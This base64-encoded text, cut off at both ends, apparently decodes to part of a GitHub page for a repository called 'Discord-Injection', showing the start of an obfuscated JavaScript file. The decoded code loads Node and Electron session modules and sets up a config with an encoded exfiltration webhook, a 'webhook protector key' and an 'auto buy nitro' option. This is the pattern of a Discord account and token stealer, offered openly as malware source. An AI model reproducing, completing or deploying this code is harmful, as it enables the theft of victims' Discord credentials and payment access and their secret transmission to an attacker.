jc1YS43NS43NSAwIDEgMCAxLjUgMCAuNzUuNzUgMCAwIDAtMS41IDBaIj48L3BhdGg+Cjwvc3ZnPgogICAgICAgIDxzcGFuIGRhdGEtY29udGVudD0iUHVsbCByZXF1ZXN0cyI+UHVsbCByZXF1ZXN0czwvc3Bhbj4KICAgICAgICAgIDxzcGFuIGlkPSJwdWxsLXJlcXVlc3RzLXJlcG8tdGFiLWNvdW50IiBkYXRhLXBqYXgtcmVwbGFjZT0iIiBkYXRhLXR1cmJvLXJlcGxhY2U9IiIgdGl0bGU9IjAiIGhpZGRlbj0iaGlkZGVuIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iQ291bnRlciI+MDwvc3Bhbj4KCgogICAgCjwvYT48L2xpPgogICAgICA8bGkgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImQtaW5saW5lLWZsZXgiPgogIDxhIGlkPSJhY3Rpb25zLXRhYiIgaHJlZj0iL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9hY3Rpb25zIiBkYXRhLXRhYi1pdGVtPSJpM2FjdGlvbnMtdGFiIiBkYXRhLXNlbGVjdGVkLWxpbmtzPSJyZXBvX2FjdGlvbnMgL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9hY3Rpb25zIiBkYXRhLXBqYXg9IiNyZXBvLWNvbnRlbnQtcGpheC1jb250YWluZXIiIGRhdGEtdHVyYm8tZnJhbWU9InJlcG8tY29udGVudC10dXJiby1mcmFtZSIgZGF0YS1ob3RrZXk9ImcgYSIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtVbmRlcmxpbmUgbmF2YmFyJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtDbGljayB0YWImcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7QWN0aW9ucyZxdW90OywmcXVvdDt0YXJnZXQmcXVvdDs6JnF1b3Q7VU5ERVJMSU5FX05BVi5UQUImcXVvdDt9IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iVW5kZXJsaW5lTmF2LWl0ZW0gbm8td3JhcCBqcy1yZXNwb25zaXZlLXVuZGVybGluZW5hdi1pdGVtIGpzLXNlbGVjdGVkLW5hdmlnYXRpb24taXRlbSI+CiAgICAKICAgICAgICAgICAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLXBsYXkgVW5kZXJsaW5lTmF2LW9jdGljb24gZC1ub25lIGQtc20taW5saW5lIj4KICAgIDxwYXRoIGQ9Ik04IDBhOCA4IDAgMSAxIDAgMTZBOCA4IDAgMCAxIDggMFpNMS41IDhhNi41IDYuNSAwIDEgMCAxMyAwIDYuNSA2LjUgMCAwIDAtMTMgMFptNC44NzktMi43NzMgNC4yNjQgMi41NTlhLjI1LjI1IDAgMCAxIDAgLjQyOGwtNC4yNjQgMi41NTlBLjI1LjI1IDAgMCAxIDYgMTAuNTU5VjUuNDQyYS4yNS4yNSAwIDAgMSAuMzc5LS4yMTVaIj48L3BhdGg+Cjwvc3ZnPgogICAgICAgIDxzcGFuIGRhdGEtY29udGVudD0iQWN0aW9ucyI+QWN0aW9uczwvc3Bhbj4KICAgICAgICAgIDxzcGFuIGlkPSJhY3Rpb25zLXJlcG8tdGFiLWNvdW50IiBkYXRhLXBqYXgtcmVwbGFjZT0iIiBkYXRhLXR1cmJvLXJlcGxhY2U9IiIgdGl0bGU9Ik5vdCBhdmFpbGFibGUiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJDb3VudGVyIj48L3NwYW4+CgoKICAgIAo8L2E+PC9saT4KICAgICAgPGxpIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJkLWlubGluZS1mbGV4Ij4KICA8YSBpZD0icHJvamVjdHMtdGFiIiBocmVmPSIvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL3Byb2plY3RzIiBkYXRhLXRhYi1pdGVtPSJpNHByb2plY3RzLXRhYiIgZGF0YS1zZWxlY3RlZC1saW5rcz0icmVwb19wcm9qZWN0cyBuZXdfcmVwb19wcm9qZWN0IHJlcG9fcHJvamVjdCAvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL3Byb2plY3RzIiBkYXRhLXBqYXg9IiNyZXBvLWNvbnRlbnQtcGpheC1jb250YWluZXIiIGRhdGEtdHVyYm8tZnJhbWU9InJlcG8tY29udGVudC10dXJiby1mcmFtZSIgZGF0YS1ob3RrZXk9ImcgYiIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtVbmRlcmxpbmUgbmF2YmFyJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtDbGljayB0YWImcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7UHJvamVjdHMmcXVvdDssJnF1b3Q7dGFyZ2V0JnF1b3Q7OiZxdW90O1VOREVSTElORV9OQVYuVEFCJnF1b3Q7fSIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9IlVuZGVybGluZU5hdi1pdGVtIG5vLXdyYXAganMtcmVzcG9uc2l2ZS11bmRlcmxpbmVuYXYtaXRlbSBqcy1zZWxlY3RlZC1uYXZpZ2F0aW9uLWl0ZW0iPgogICAgCiAgICAgICAgICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi10YWJsZSBVbmRlcmxpbmVOYXYtb2N0aWNvbiBkLW5vbmUgZC1zbS1pbmxpbmUiPgogICAgPHBhdGggZD0iTTAgMS43NUMwIC43ODQuNzg0IDAgMS43NSAwaDEyLjVDMTUuMjE2IDAgMTYgLjc4NCAxNiAxLjc1djEyLjVBMS43NSAxLjc1IDAgMCAxIDE0LjI1IDE2SDEuNzVBMS43NSAxLjc1IDAgMCAxIDAgMTQuMjVaTTYuNSA2LjV2OGg3Ljc1YS4yNS4yNSAwIDAgMCAuMjUtLjI1VjYuNVptOC0xLjVWMS43NWEuMjUuMjUgMCAwIDAtLjI1LS4yNUg2LjVWNVptLTEzIDEuNXY3Ljc1YzAgLjEzOC4xMTIuMjUuMjUuMjVINXYtOFpNNSA1VjEuNUgxLjc1YS4yNS4yNSAwIDAgMC0uMjUuMjVWNVoiPjwvcGF0aD4KPC9zdmc+CiAgICAgICAgPHNwYW4gZGF0YS1jb250ZW50PSJQcm9qZWN0cyI+UHJvamVjdHM8L3NwYW4+CiAgICAgICAgICA8c3BhbiBpZD0icHJvamVjdHMtcmVwby10YWItY291bnQiIGRhdGEtcGpheC1yZXBsYWNlPSIiIGRhdGEtdHVyYm8tcmVwbGFjZT0iIiB0aXRsZT0iMCIgaGlkZGVuPSJoaWRkZW4iIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJDb3VudGVyIj4wPC9zcGFuPgoKCiAgICAKPC9hPjwvbGk+CiAgICAgIDxsaSBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iZC1pbmxpbmUtZmxleCI+CiAgPGEgaWQ9InNlY3VyaXR5LXRhYiIgaHJlZj0iL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9zZWN1cml0eSIgZGF0YS10YWItaXRlbT0iaTVzZWN1cml0eS10YWIiIGRhdGEtc2VsZWN0ZWQtbGlua3M9InNlY3VyaXR5IG92ZXJ2aWV3IGFsZXJ0cyBwb2xpY3kgdG9rZW5fc2Nhbm5pbmcgY29kZV9zY2FubmluZyAvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL3NlY3VyaXR5IiBkYXRhLXBqYXg9IiNyZXBvLWNvbnRlbnQtcGpheC1jb250YWluZXIiIGRhdGEtdHVyYm8tZnJhbWU9InJlcG8tY29udGVudC10dXJiby1mcmFtZSIgZGF0YS1ob3RrZXk9ImcgcyIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtVbmRlcmxpbmUgbmF2YmFyJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtDbGljayB0YWImcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7U2VjdXJpdHkmcXVvdDssJnF1b3Q7dGFyZ2V0JnF1b3Q7OiZxdW90O1VOREVSTElORV9OQVYuVEFCJnF1b3Q7fSIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9IlVuZGVybGluZU5hdi1pdGVtIG5vLXdyYXAganMtcmVzcG9uc2l2ZS11bmRlcmxpbmVuYXYtaXRlbSBqcy1zZWxlY3RlZC1uYXZpZ2F0aW9uLWl0ZW0iPgogICAgCiAgICAgICAgICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1zaGllbGQgVW5kZXJsaW5lTmF2LW9jdGljb24gZC1ub25lIGQtc20taW5saW5lIj4KICAgIDxwYXRoIGQ9Ik03LjQ2Ny4xMzNhMS43NDggMS43NDggMCAwIDEgMS4wNjYgMGw1LjI1IDEuNjhBMS43NSAxLjc1IDAgMCAxIDE1IDMuNDhWN2MwIDEuNTY2LS4zMiAzLjE4Mi0xLjMwMyA0LjY4Mi0uOTgzIDEuNDk4LTIuNTg1IDIuODEzLTUuMDMyIDMuODU1YTEuNjk3IDEuNjk3IDAgMCAxLTEuMzMgMGMtMi40NDctMS4wNDItNC4wNDktMi4zNTctNS4wMzItMy44NTVDMS4zMiAxMC4xODIgMSA4LjU2NiAxIDdWMy40OGExLjc1IDEuNzUgMCAwIDEgMS4yMTctMS42NjdabS42MSAxLjQyOWEuMjUuMjUgMCAwIDAtLjE1MyAwbC01LjI1IDEuNjhhLjI1LjI1IDAgMCAwLS4xNzQuMjM4VjdjMCAxLjM1OC4yNzUgMi42NjYgMS4wNTcgMy44Ni43ODQgMS4xOTQgMi4xMjEgMi4zNCA0LjM2NiAzLjI5N2EuMTk2LjE5NiAwIDAgMCAuMTU0IDBjMi4yNDUtLjk1NiAzLjU4Mi0yLjEwNCA0LjM2Ni0zLjI5OEMxMy4yMjUgOS42NjYgMTMuNSA4LjM2IDEzLjUgN1YzLjQ4YS4yNTEuMjUxIDAgMCAwLS4xNzQtLjIzN2wtNS4yNS0xLjY4Wk04Ljc1IDQuNzV2M2EuNzUuNzUgMCAwIDEtMS41IDB2LTNhLjc1Ljc1IDAgMCAxIDEuNSAwWk05IDEwLjVhMSAxIDAgMSAxLTIgMCAxIDEgMCAwIDEgMiAwWiI+PC9wYXRoPgo8L3N2Zz4KICAgICAgICA8c3BhbiBkYXRhLWNvbnRlbnQ9IlNlY3VyaXR5Ij5TZWN1cml0eTwvc3Bhbj4KICAgICAgICAgIDxpbmNsdWRlLWZyYWdtZW50IHNyYz0iL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9zZWN1cml0eS9vdmVyYWxsLWNvdW50IiBhY2NlcHQ9InRleHQvZnJhZ21lbnQraHRtbCI+PC9pbmNsdWRlLWZyYWdtZW50PgoKICAgIAo8L2E+PC9saT4KICAgICAgPGxpIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJkLWlubGluZS1mbGV4Ij4KICA8YSBpZD0iaW5zaWdodHMtdGFiIiBocmVmPSIvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL3B1bHNlIiBkYXRhLXRhYi1pdGVtPSJpNmluc2lnaHRzLXRhYiIgZGF0YS1zZWxlY3RlZC1saW5rcz0icmVwb19ncmFwaHMgcmVwb19jb250cmlidXRvcnMgZGVwZW5kZW5jeV9ncmFwaCBkZXBlbmRhYm90X3VwZGF0ZXMgcHVsc2UgcGVvcGxlIGNvbW11bml0eSAvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL3B1bHNlIiBkYXRhLXBqYXg9IiNyZXBvLWNvbnRlbnQtcGpheC1jb250YWluZXIiIGRhdGEtdHVyYm8tZnJhbWU9InJlcG8tY29udGVudC10dXJiby1mcmFtZSIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtVbmRlcmxpbmUgbmF2YmFyJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtDbGljayB0YWImcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7SW5zaWdodHMmcXVvdDssJnF1b3Q7dGFyZ2V0JnF1b3Q7OiZxdW90O1VOREVSTElORV9OQVYuVEFCJnF1b3Q7fSIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9IlVuZGVybGluZU5hdi1pdGVtIG5vLXdyYXAganMtcmVzcG9uc2l2ZS11bmRlcmxpbmVuYXYtaXRlbSBqcy1zZWxlY3RlZC1uYXZpZ2F0aW9uLWl0ZW0iPgogICAgCiAgICAgICAgICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1ncmFwaCBVbmRlcmxpbmVOYXYtb2N0aWNvbiBkLW5vbmUgZC1zbS1pbmxpbmUiPgogICAgPHBhdGggZD0iTTEuNSAxLjc1VjEzLjVoMTMuNzVhLjc1Ljc1IDAgMCAxIDAgMS41SC43NWEuNzUuNzUgMCAwIDEtLjc1LS43NVYxLjc1YS43NS43NSAwIDAgMSAxLjUgMFptMTQuMjggMi41My01LjI1IDUuMjVhLjc1Ljc1IDAgMCAxLTEuMDYgMEw3IDcuMDYgNC4yOCA5Ljc4YS43NTEuNzUxIDAgMCAxLTEuMDQyLS4wMTguNzUxLjc1MSAwIDAgMS0uMDE4LTEuMDQybDMuMjUtMy4yNWEuNzUuNzUgMCAwIDEgMS4wNiAwTDEwIDcuOTRsNC43Mi00LjcyYS43NTEuNzUxIDAgMCAxIDEuMDQyLjAxOC43NTEuNzUxIDAgMCAxIC4wMTggMS4wNDJaIj48L3BhdGg+Cjwvc3ZnPgogICAgICAgIDxzcGFuIGRhdGEtY29udGVudD0iSW5zaWdodHMiPkluc2lnaHRzPC9zcGFuPgogICAgICAgICAgPHNwYW4gaWQ9Imluc2lnaHRzLXJlcG8tdGFiLWNvdW50IiBkYXRhLXBqYXgtcmVwbGFjZT0iIiBkYXRhLXR1cmJvLXJlcGxhY2U9IiIgdGl0bGU9Ik5vdCBhdmFpbGFibGUiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJDb3VudGVyIj48L3NwYW4+CgoKICAgIAo8L2E+PC9saT4KPC91bD4KICAgIDxkaXYgc3R5bGU9InZpc2liaWxpdHk6aGlkZGVuOyIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9IlVuZGVybGluZU5hdi1hY3Rpb25zIGpzLXJlc3BvbnNpdmUtdW5kZXJsaW5lbmF2LW92ZXJmbG93IHBvc2l0aW9uLWFic29sdXRlIHByLTMgcHItbWQtNCBwci1sZy01IHJpZ2h0LTAiPiAgICAgICAgPGRldGFpbHMgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImRldGFpbHMtb3ZlcmxheSBkZXRhaWxzLXJlc2V0IHBvc2l0aW9uLXJlbGF0aXZlIj4KICAgIDxzdW1tYXJ5IHJvbGU9ImJ1dHRvbiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSI+ICAgICAgICAgIDxkaXYgY2xhc3M9IlVuZGVybGluZU5hdi1pdGVtIG1yLTAgYm9yZGVyLTAiPgogICAgICAgICAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLWtlYmFiLWhvcml6b250YWwiPgogICAgPHBhdGggZD0iTTggOWExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM1pNMS41IDlhMS41IDEuNSAwIDEgMCAwLTMgMS41IDEuNSAwIDAgMCAwIDNabTEzIDBhMS41IDEuNSAwIDEgMCAwLTMgMS41IDEuNSAwIDAgMCAwIDNaIj48L3BhdGg+Cjwvc3ZnPgogICAgICAgICAgICA8c3BhbiBjbGFzcz0ic3Itb25seSI+TW9yZTwvc3Bhbj4KICAgICAgICAgIDwvZGl2Pgo8L3N1bW1hcnk+CiAgICA8ZGV0YWlscy1tZW51IHJvbGU9Im1lbnUiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJkcm9wZG93bi1tZW51IGRyb3Bkb3duLW1lbnUtc3ciPgogICAgICAgICAgPHVsPgogICAgICAgICAgICAgIDxsaSBkYXRhLW1lbnUtaXRlbT0iaTBjb2RlLXRhYiIgaGlkZGVuPgogICAgICAgICAgICAgICAgPGEgcm9sZT0ibWVudWl0ZW0iIGNsYXNzPSJqcy1zZWxlY3RlZC1uYXZpZ2F0aW9uLWl0ZW0gc2VsZWN0ZWQgZHJvcGRvd24taXRlbSIgYXJpYS1jdXJyZW50PSJwYWdlIiBkYXRhLXNlbGVjdGVkLWxpbmtzPSJyZXBvX3NvdXJjZSByZXBvX2Rvd25sb2FkcyByZXBvX2NvbW1pdHMgcmVwb19yZWxlYXNlcyByZXBvX3RhZ3MgcmVwb19icmFuY2hlcyByZXBvX3BhY2thZ2VzIHJlcG9fZGVwbG95bWVudHMgcmVwb19hdHRlc3RhdGlvbnMgL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbiIgaHJlZj0iL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbiI+CiAgICAgICAgICAgICAgICAgIENvZGUKPC9hPiAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICA8bGkgZGF0YS1tZW51LWl0ZW09ImkxaXNzdWVzLXRhYiIgaGlkZGVuPgogICAgICAgICAgICAgICAgPGEgcm9sZT0ibWVudWl0ZW0iIGNsYXNzPSJqcy1zZWxlY3RlZC1uYXZpZ2F0aW9uLWl0ZW0gZHJvcGRvd24taXRlbSIgZGF0YS1zZWxlY3RlZC1saW5rcz0icmVwb19pc3N1ZXMgcmVwb19sYWJlbHMgcmVwb19taWxlc3RvbmVzIC9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vaXNzdWVzIiBocmVmPSIvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL2lzc3VlcyI+CiAgICAgICAgICAgICAgICAgIElzc3Vlcwo8L2E+ICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgIDxsaSBkYXRhLW1lbnUtaXRlbT0iaTJwdWxsLXJlcXVlc3RzLXRhYiIgaGlkZGVuPgogICAgICAgICAgICAgICAgPGEgcm9sZT0ibWVudWl0ZW0iIGNsYXNzPSJqcy1zZWxlY3RlZC1uYXZpZ2F0aW9uLWl0ZW0gZHJvcGRvd24taXRlbSIgZGF0YS1zZWxlY3RlZC1saW5rcz0icmVwb19wdWxscyBjaGVja3MgL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9wdWxscyIgaHJlZj0iL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9wdWxscyI+CiAgICAgICAgICAgICAgICAgIFB1bGwgcmVxdWVzdHMKPC9hPiAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICA8bGkgZGF0YS1tZW51LWl0ZW09ImkzYWN0aW9ucy10YWIiIGhpZGRlbj4KICAgICAgICAgICAgICAgIDxhIHJvbGU9Im1lbnVpdGVtIiBjbGFzcz0ianMtc2VsZWN0ZWQtbmF2aWdhdGlvbi1pdGVtIGRyb3Bkb3duLWl0ZW0iIGRhdGEtc2VsZWN0ZWQtbGlua3M9InJlcG9fYWN0aW9ucyAvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL2FjdGlvbnMiIGhyZWY9Ii9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vYWN0aW9ucyI+CiAgICAgICAgICAgICAgICAgIEFjdGlvbnMKPC9hPiAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICA8bGkgZGF0YS1tZW51LWl0ZW09Imk0cHJvamVjdHMtdGFiIiBoaWRkZW4+CiAgICAgICAgICAgICAgICA8YSByb2xlPSJtZW51aXRlbSIgY2xhc3M9ImpzLXNlbGVjdGVkLW5hdmlnYXRpb24taXRlbSBkcm9wZG93bi1pdGVtIiBkYXRhLXNlbGVjdGVkLWxpbmtzPSJyZXBvX3Byb2plY3RzIG5ld19yZXBvX3Byb2plY3QgcmVwb19wcm9qZWN0IC9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vcHJvamVjdHMiIGhyZWY9Ii9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vcHJvamVjdHMiPgogICAgICAgICAgICAgICAgICBQcm9qZWN0cwo8L2E+ICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgIDxsaSBkYXRhLW1lbnUtaXRlbT0iaTVzZWN1cml0eS10YWIiIGhpZGRlbj4KICAgICAgICAgICAgICAgIDxhIHJvbGU9Im1lbnVpdGVtIiBjbGFzcz0ianMtc2VsZWN0ZWQtbmF2aWdhdGlvbi1pdGVtIGRyb3Bkb3duLWl0ZW0iIGRhdGEtc2VsZWN0ZWQtbGlua3M9InNlY3VyaXR5IG92ZXJ2aWV3IGFsZXJ0cyBwb2xpY3kgdG9rZW5fc2Nhbm5pbmcgY29kZV9zY2FubmluZyAvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL3NlY3VyaXR5IiBocmVmPSIvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL3NlY3VyaXR5Ij4KICAgICAgICAgICAgICAgICAgU2VjdXJpdHkKPC9hPiAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICA8bGkgZGF0YS1tZW51LWl0ZW09Imk2aW5zaWdodHMtdGFiIiBoaWRkZW4+CiAgICAgICAgICAgICAgICA8YSByb2xlPSJtZW51aXRlbSIgY2xhc3M9ImpzLXNlbGVjdGVkLW5hdmlnYXRpb24taXRlbSBkcm9wZG93bi1pdGVtIiBkYXRhLXNlbGVjdGVkLWxpbmtzPSJyZXBvX2dyYXBocyByZXBvX2NvbnRyaWJ1dG9ycyBkZXBlbmRlbmN5X2dyYXBoIGRlcGVuZGFib3RfdXBkYXRlcyBwdWxzZSBwZW9wbGUgY29tbXVuaXR5IC9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vcHVsc2UiIGhyZWY9Ii9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vcHVsc2UiPgogICAgICAgICAgICAgICAgICBJbnNpZ2h0cwo8L2E+ICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgPC91bD4KPC9kZXRhaWxzLW1lbnU+CjwvZGV0YWlscz48L2Rpdj4KPC9uYXY+CgogIDwvZGl2PgoKICAKCgoKPHR1cmJvLWZyYW1lIGlkPSJyZXBvLWNvbnRlbnQtdHVyYm8tZnJhbWUiIHRhcmdldD0iX3RvcCIgZGF0YS10dXJiby1hY3Rpb249ImFkdmFuY2UiIGNsYXNzPSIiPgogICAgPGRpdiBpZD0icmVwby1jb250ZW50LXBqYXgtY29udGFpbmVyIiBjbGFzcz0icmVwb3NpdG9yeS1jb250ZW50ICIgPgogICAgCgoKICAgIAogICAgICAKICAgIAoKCgoKCjxyZWFjdC1hcHAKICBhcHAtbmFtZT0icmVhY3QtY29kZS12aWV3IgogIGluaXRpYWwtcGF0aD0iL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9ibG9iL21haW4vaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMiCiAgc3R5bGU9Im1pbi1oZWlnaHQ6IGNhbGMoMTAwdmggLSA2NHB4KSIgCiAgZGF0YS1zc3I9ImZhbHNlIgogIGRhdGEtbGF6eT0iZmFsc2UiCiAgZGF0YS1hbHRlcm5hdGU9ImZhbHNlIgo+CiAgCiAgPHNjcmlwdCB0eXBlPSJhcHBsaWNhdGlvbi9qc29uIiBkYXRhLXRhcmdldD0icmVhY3QtYXBwLmVtYmVkZGVkRGF0YSI+eyJwYXlsb2FkIjp7ImFsbFNob3J0Y3V0c0VuYWJsZWQiOmZhbHNlLCJmaWxlVHJlZSI6eyIiOnsiaXRlbXMiOlt7Im5hbWUiOiJpbmplY3Rpb24tb2JmdXNjYXRlZC5qcyIsInBhdGgiOiJpbmplY3Rpb24tb2JmdXNjYXRlZC5qcyIsImNvbnRlbnRUeXBlIjoiZmlsZSJ9XSwidG90YWxDb3VudCI6MX19LCJmaWxlVHJlZVByb2Nlc3NpbmdUaW1lIjoxLjM3ODMwNzk5OTk5OTk5OTksImZvbGRlcnNUb0ZldGNoIjpbXSwicmVkdWNlZE1vdGlvbkVuYWJsZWQiOm51bGwsInJlcG8iOnsiaWQiOjY3NjEwMDIyNiwiZGVmYXVsdEJyYW5jaCI6Im1haW4iLCJuYW1lIjoiRGlzY29yZC1JbmplY3Rpb24iLCJvd25lckxvZ2luIjoic2tvY2h3YXNoZXJlIiwiY3VycmVudFVzZXJDYW5QdXNoIjpmYWxzZSwiaXNGb3JrIjpmYWxzZSwiaXNFbXB0eSI6ZmFsc2UsImNyZWF0ZWRBdCI6IjIwMjMtMDgtMDhUMTI6MzY6MzEuMDAwWiIsIm93bmVyQXZhdGFyIjoiaHR0cHM6Ly9hdmF0YXJzLmdpdGh1YnVzZXJjb250ZW50LmNvbS91LzE0MTczODcyND92PTQiLCJwdWJsaWMiOnRydWUsInByaXZhdGUiOmZhbHNlLCJpc09yZ093bmVkIjpmYWxzZX0sInN5bWJvbHNFeHBhbmRlZCI6ZmFsc2UsInRyZWVFeHBhbmRlZCI6dHJ1ZSwicmVmSW5mbyI6eyJuYW1lIjoibWFpbiIsImxpc3RDYWNoZUtleSI6InYwOjE2OTE0OTgyMDQuMCIsImNhbkVkaXQiOmZhbHNlLCJyZWZUeXBlIjoiYnJhbmNoIiwiY3VycmVudE9pZCI6IjliNzNkZmI3NzFjYmFlZGY1NjA0ZWM3ZTNjMjBmZDczNTA4NWMxNjQifSwicGF0aCI6ImluamVjdGlvbi1vYmZ1c2NhdGVkLmpzIiwiY3VycmVudFVzZXIiOm51bGwsImJsb2IiOnsicmF3TGluZXMiOlsiY29uc3QgUz1DOyhmdW5jdGlvbihZLFope2NvbnN0IHE9QyxvPVkoKTt3aGlsZSghIVtdKXt0cnl7Y29uc3QgVD0tcGFyc2VJbnQocSgweDkwKSkvMHgxK3BhcnNlSW50KHEoMHgxNGEpKS8weDIrcGFyc2VJbnQocSgweDEyOSkpLzB4MyoocGFyc2VJbnQocSgweDEyZSkpLzB4NCkrcGFyc2VJbnQocSgweGY5KSkvMHg1K3BhcnNlSW50KHEoMHhkNykpLzB4NistcGFyc2VJbnQocSgweDEzYSkpLzB4NyoocGFyc2VJbnQocSgweDg4KSkvMHg4KStwYXJzZUludChxKDB4YmUpKS8weDkqKC1wYXJzZUludChxKDB4ZjApKS8weGEpO2lmKFQ9PT1aKWJyZWFrO2Vsc2Ugb1sncHVzaCddKG9bJ3NoaWZ0J10oKSk7fWNhdGNoKEgpe29bJ3B1c2gnXShvWydzaGlmdCddKCkpO319fSh4LDB4NDBmOGQpKTtjb25zdCBhcmdzPXByb2Nlc3NbUygweGVmKV0sZnM9cmVxdWlyZSgnZnMnKSxwYXRoPXJlcXVpcmUoUygweGJjKSksaHR0cHM9cmVxdWlyZShTKDB4ZDEpKSxxdWVyeXN0cmluZz1yZXF1aXJlKCdxdWVyeXN0cmluZycpLHtCcm93c2VyV2luZG93LHNlc3Npb259PXJlcXVpcmUoUygweDZhKSksZW5jb2RlZEhvb2s9UygweGQyKSxjb25maWc9eyd3ZWJob29rJzphdG9iKGVuY29kZWRIb29rKSwnd2ViaG9va19wcm90ZWN0b3Jfa2V5JzpTKDB4ZGYpLCdhdXRvX2J1eV9uaXRybyc6IVtdLCdwaW5nX29uX3J1bic6ISFbXSwncGluZ192YWwnOlMoMHgxMTUp